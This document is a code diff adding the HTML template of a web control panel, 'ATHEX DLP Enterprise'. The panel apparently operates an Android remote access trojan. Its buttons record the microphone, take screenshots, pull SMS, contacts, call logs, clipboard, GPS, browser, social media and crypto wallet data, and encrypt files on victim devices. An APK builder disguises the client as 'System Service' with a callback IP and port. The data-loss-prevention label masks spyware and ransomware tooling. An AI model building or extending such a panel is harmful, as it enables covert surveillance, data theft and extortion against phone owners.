@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="cyberpunk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#0a0e17">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>ATHEX DLP | Enterprise Control</title>
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Three.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    
+    <!-- Socket.IO -->
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    
+    <!-- Dashboard CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard.css') }}">
+    <link rel="stylesheet" href="/server/static/css/dashboard.css">
+</head>
+<body>
+    <!-- Three.js Background -->
+    <canvas id="cyber-bg"></canvas>
+    
+    <!-- Toast Container -->
+    <div class="toast-container" id="toastContainer"></div>
+    
+    <!-- Slide Panel Overlay -->
+    <div class="slide-panel-overlay" id="slidePanelOverlay"></div>
+
+    <!-- App Container -->
+    <div class="app-container">
+        
+        <!-- ============================================================ -->
+        <!-- SIDEBAR -->
+        <!-- ============================================================ -->
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-logo">
+                <h1>◆ ATHEX DLP</h1>
+                <div class="version">Enterprise v{{ version }}</div>
+            </div>
+            
+            <nav class="sidebar-nav">
+                <div class="nav-section">
+                    <div class="nav-section-title">Main Menu</div>
+                    <a class="nav-item active" data-page="home">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>Devices</span>
+                        <span class="nav-badge" id="clientBadge">0</span>
+                    </a>
+                    <a class="nav-item" data-page="notifications">
+                        <i class="fas fa-bell"></i>
+                        <span>Live Feed</span>
+                        <span class="nav-badge" id="notifBadge">0</span>
+                    </a>
+                    <a class="nav-item" data-page="files">
+                        <i class="fas fa-folder-tree"></i>
+                        <span>File Explorer</span>
+                    </a>
+                    <a class="nav-item" data-page="builder">
+                        <i class="fas fa-hammer"></i>
+                        <span>APK Builder</span>
+                    </a>
+                </div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">Tools</div>
+                    <a class="nav-item" data-page="logs">
+                        <i class="fas fa-terminal"></i>
+                        <span>System Logs</span>
+                    </a>
+                    <a class="nav-item" data-page="settings">
+                        <i class="fas fa-cog"></i>
+                        <span>Settings</span>
+                    </a>
+                </div>
+            </nav>
+            
+            <div class="sidebar-footer">
+                <div class="status-pill">
+                    <span class="status-dot online" id="connectionDot"></span>
+                    <span id="connectionText">Connected</span>
+                </div>
+            </div>
+        </aside>
+
+        <!-- ============================================================ -->
+        <!-- SLIDE PANEL (Device Manager) -->
+        <!-- ============================================================ -->
+        <div class="slide-panel" id="slidePanel">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--border-subtle);">
+                <h3 style="margin:0;font-size:16px;" id="sidebarDeviceName">📱 Device Manager</h3>
+                <button onclick="closeSlidePanel()" style="background:none;border:1px solid var(--border-subtle);color:var(--text-primary);width:30px;height:30px;border-radius:50%;cursor:pointer;font-size:14px;">✕</button>
+            </div>
+            
+            <div id="sidebarDeviceInfo" style="margin-bottom:16px;padding:12px;background:var(--bg-card);border-radius:var(--radius-sm);"></div>
+            
+            <div style="display:flex;flex-direction:column;gap:6px;" id="sidebarActions">
+                <button class="btn" onclick="deviceAction('screenshot')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-camera" style="color:var(--accent-cyan);width:20px;"></i> 📸 Capture Screenshot
+                </button>
+                <button class="btn" onclick="deviceAction('microphone')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-microphone" style="color:var(--accent-purple);width:20px;"></i> 🎤 Record Microphone
+                </button>
+                <button class="btn" onclick="deviceAction('files')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-folder-open" style="color:var(--accent-yellow);width:20px;"></i> 📁 Browse Files
+                </button>
+                <button class="btn" onclick="deviceAction('notifications')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-bell" style="color:var(--accent-cyan);width:20px;"></i> 🔔 Get Notifications
+                </button>
+                <button class="btn" onclick="deviceAction('location')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-map-marker-alt" style="color:var(--accent-green);width:20px;"></i> 📍 GPS Location
+                </button>
+                <button class="btn" onclick="deviceAction('contacts')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-address-book" style="color:var(--accent-purple);width:20px;"></i> 👥 Get Contacts
+                </button>
+                <button class="btn" onclick="deviceAction('sms')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-sms" style="color:var(--accent-cyan);width:20px;"></i> 💬 Get SMS
+                </button>
+                <button class="btn" onclick="deviceAction('calls')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-phone" style="color:var(--accent-green);width:20px;"></i> 📞 Call Logs
+                </button>
+                <button class="btn" onclick="deviceAction('clipboard')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-clipboard" style="color:var(--accent-yellow);width:20px;"></i> 📋 Clipboard
+                </button>
+                <button class="btn" onclick="deviceAction('apps')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-th-large" style="color:var(--accent-purple);width:20px;"></i> 📱 Installed Apps
+                </button>
+                <button class="btn" onclick="deviceAction('browser')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-globe" style="color:var(--accent-cyan);width:20px;"></i> 🌐 Browser Data
+                </button>
+                <button class="btn" onclick="deviceAction('social')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-comments" style="color:var(--accent-green);width:20px;"></i> 💬 Social Media
+                </button>
+                <button class="btn" onclick="deviceAction('crypto')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-wallet" style="color:var(--accent-yellow);width:20px;"></i> 🔐 Crypto Wallets
+                </button>
+                <button class="btn btn-danger" onclick="deviceAction('encrypt')" style="justify-content:flex-start;padding:12px;">
+                    <i class="fas fa-lock" style="width:20px;"></i> 🔒 Encrypt Files
+                </button>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- MAIN CONTENT -->
+        <!-- ============================================================ -->
+        <main class="main-content" id="mainContent">
+            
+            <!-- Top Bar -->
+            <div class="topbar">
+                <div style="display:flex;align-items:center;gap:12px;">
+                    <button class="btn mobile-menu-btn" onclick="toggleSidebar()" style="display:none;">
+                        <i class="fas fa-bars"></i>
+                    </button>
+                    <h1 class="page-title" id="pageTitle">📱 Connected Devices</h1>
+                </div>
+                <div class="topbar-actions">
+                    <button class="btn btn-sm" onclick="refreshAll()">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                    <button class="btn btn-primary btn-sm" onclick="showConfigModal()">
+                        <i class="fas fa-plus"></i> New Connection
+                    </button>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- PAGE: HOME -->
+            <!-- ============================================================ -->
+            <div class="page-section" id="page-home">
+                <!-- Stats -->
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon cyan"><i class="fas fa-mobile-alt"></i></div>
+                        <div class="stat-value" id="activeDevices">0</div>
+                        <div class="stat-label">Active Devices</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon green"><i class="fas fa-bell"></i></div>
+                        <div class="stat-value" id="totalNotifications">0</div>
+                        <div class="stat-label">Notifications</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon purple"><i class="fas fa-lock"></i></div>
+                        <div class="stat-value" id="encryptedFiles">0</div>
+                        <div class="stat-label">Files Encrypted</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon cyan"><i class="fas fa-database"></i></div>
+                        <div class="stat-value" id="dataTransferred">0 MB</div>
+                        <div class="stat-label">Data Transferred</div>
+                    </div>
+                </div>
+                
+                <!-- Device Grid -->
+                <div class="device-grid" id="deviceGrid">
+                    <div style="grid-column:1/-1;text-align:center;padding:60px;color:var(--text-muted);">
+                        <i class="fas fa-satellite-dish" style="font-size:48px;display:block;margin-bottom:16px;opacity:0.5;"></i>
+                        <p>No devices connected</p>
+                        <p style="font-size:12px;margin-top:8px;">Waiting for Android clients to connect on TCP port...</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- PAGE: NOTIFICATIONS -->
+            <!-- ============================================================ -->
+            <div class="page-section hidden" id="page-notifications">
+                <div class="card" style="margin-bottom:16px;">
+                    <div class="card-header">
+                        <div class="card-title">
+                            <i class="fas fa-terminal" style="color:#00ff41;"></i> Live Notification Stream
+                        </div>
+                        <div style="display:flex;gap:8px;">
+                            <button class="btn btn-sm" onclick="clearTerminal()"><i class="fas fa-eraser"></i> Clear</button>
+                            <button class="btn btn-sm" onclick="toggleAutoScroll()"><i class="fas fa-pause"></i> Pause</button>
+                            <button class="btn btn-sm" onclick="exportTerminalLog()"><i class="fas fa-download"></i> Export</button>
+                        </div>
+                    </div>
+                    <div class="terminal-container">
+                        <div class="terminal-header">
+                            <span class="terminal-dot red"></span>
+                            <span class="terminal-dot yellow"></span>
+                            <span class="terminal-dot green"></span>
+                            <span class="terminal-title">athex-dlp-terminal</span>
+                        </div>
+                        <div class="terminal-body" id="terminalBody">
+                            <div class="terminal-line system">[SYSTEM] ATHEX DLP Terminal initialized</div>
+                            <div class="terminal-line info">[INFO] Waiting for notifications...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- PAGE: FILE EXPLORER -->
+            <!-- ============================================================ -->
+            <div class="page-section hidden" id="page-files">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">
+                            <i class="fas fa-folder-open" style="color:#f59e0b;"></i> Remote File Explorer
+                        </div>
+                        <div style="display:flex;gap:8px;">
+                            <select id="clientSelector" class="input-field" style="width:200px;padding:8px;" onchange="loadFiles()">
+                                <option value="">Select Device</option>
+                            </select>
+                            <button class="btn btn-primary btn-sm" onclick="loadFiles()">
+                                <i class="fas fa-folder-open"></i> Browse
+                            </button>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <div class="file-path-bar" id="pathBar">
+                            <span class="path-segment" onclick="navigatePath('/')">/</span>
+                            <span class="path-separator">›</span>
+                            <span class="path-segment" onclick="navigatePath('/sdcard')">sdcard</span>
+                        </div>
+                        <div class="file-grid" id="fileGrid">
+                            <div style="grid-column:1/-1;text-align:center;color:var(--text-muted);padding:40px;">
+                                <i class="fas fa-cloud-upload-alt" style="font-size:48px;display:block;margin-bottom:16px;"></i>
+                                Select a device to browse files
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- PAGE: APK BUILDER -->
+            <!-- ============================================================ -->
+            <div class="page-section hidden" id="page-builder">
+                <div class="card" style="margin-bottom:16px;">
+                    <div class="card-header">
+                        <div class="card-title"><i class="fas fa-hammer" style="color:var(--accent-cyan);"></i> Server Configuration</div>
+                    </div>
+                    <div class="card-body">
+                        <div class="input-group">
+                            <label class="input-label">Server IP Address</label>
+                            <input type="text" class="input-field" id="builderIP" value="127.0.0.1" placeholder="143.198.45.20">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">Server Port</label>
+                            <input type="number" class="input-field" id="builderPort" value="22533">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card" style="margin-bottom:16px;">
+                    <div class="card-header">
+                        <div class="card-title"><i class="fas fa-mobile-alt" style="color:var(--accent-purple);"></i> App Customization</div>
+                    </div>
+                    <div class="card-body">
+                        <div class="input-group">
+                            <label class="input-label">App Display Name</label>
+                            <input type="text" class="input-field" id="builderAppName" value="System Service" placeholder="System Service">
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="neon-btn" onclick="buildAPK()" style="width:100%;">⚡ BUILD APK NOW</button>
+                <div id="buildStatus" style="margin-top:16px;text-align:center;"></div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- PAGE: LOGS -->
+            <!-- ============================================================ -->
+            <div class="page-section hidden" id="page-logs">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title"><i class="fas fa-terminal" style="color:#00ff41;"></i> System Logs</div>
+                        <button class="btn btn-sm" onclick="clearTerminal()"><i class="fas fa-eraser"></i> Clear</button>
+                    </div>
+                    <div class="terminal-container">
+                        <div class="terminal-body" id="logsBody" style="max-height:600px;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- PAGE: SETTINGS -->
+            <!-- ============================================================ -->
+            <div class="page-section hidden" id="page-settings">
+                <div class="card" style="margin-bottom:16px;">
+                    <div class="card-header">
+                        <div class="card-title"><i class="fas fa-cog" style="color:var(--accent-cyan);"></i> Server Settings</div>
+                    </div>
+                    <div class="card-body">
+                        <div class="input-group">
+                            <label class="input-label">Web Dashboard Port</label>
+                            <input type="number" class="input-field" value="5000" readonly>
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">TCP Server Port</label>
+                            <input type="number" class="input-field" value="22533" readonly>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title"><i class="fas fa-info-circle" style="color:var(--accent-purple);"></i> System Info</div>
+                    </div>
+                    <div class="card-body">
+                        <p class="text-sm text-muted">ATHEX DLP Enterprise v{{ version }}</p>
+                        <p class="text-sm text-muted">Flask + Socket.IO + Three.js</p>
+                        <p class="text-sm text-muted">Android Client v2.0.0</p>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- BOTTOM NAVIGATION (Mobile) -->
+    <!-- ============================================================ -->
+    <nav class="bottom-nav">
+        <div class="bottom-nav-item active" data-page="home">
+            <i class="fas fa-mobile-alt"></i>
+            <span>Devices</span>
+        </div>
+        <div class="bottom-nav-item" data-page="notifications">
+            <i class="fas fa-bell"></i>
+            <span>Feed</span>
+        </div>
+        <div class="bottom-nav-item" data-page="files">
+            <i class="fas fa-folder"></i>
+            <span>Files</span>
+        </div>
+        <div class="bottom-nav-item" data-page="builder">
+            <i class="fas fa-hammer"></i>
+            <span>Builder</span>
+        </div>
+    </nav>
+
+    <!-- ============================================================ -->
+    <!-- CONFIG MODAL -->
+    <!-- ============================================================ -->
+    <div class="modal-overlay" id="configModal" style="display:none;">
+        <div class="modal">
+            <div class="modal-title">⚙️ Server Configuration</div>
+            <div class="input-group">
+                <label class="input-label">Target Host</label>
+                <input type="text" class="input-field" id="configHost" value="127.0.0.1">
+            </div>
+            <div class="input-group">
+                <label class="input-label">Target Port</label>
+                <input type="number" class="input-field" id="configPort" value="22533">
+            </div>
+            <div style="display:flex;justify-content:flex-end;gap:8px;margin-top:16px;">
+                <button class="btn" onclick="closeConfigModal()">Cancel</button>
+                <button class="btn btn-primary" onclick="saveConfig()">Save</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SCRIPTS -->
+    <!-- ============================================================ -->
+    <script src="{{ url_for('static', filename='js/terminal.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+    <script src="/server/static/js/terminal.js"></script>
+    <script src="/server/static/js/dashboard.js"></script>
+</body>
+</html>
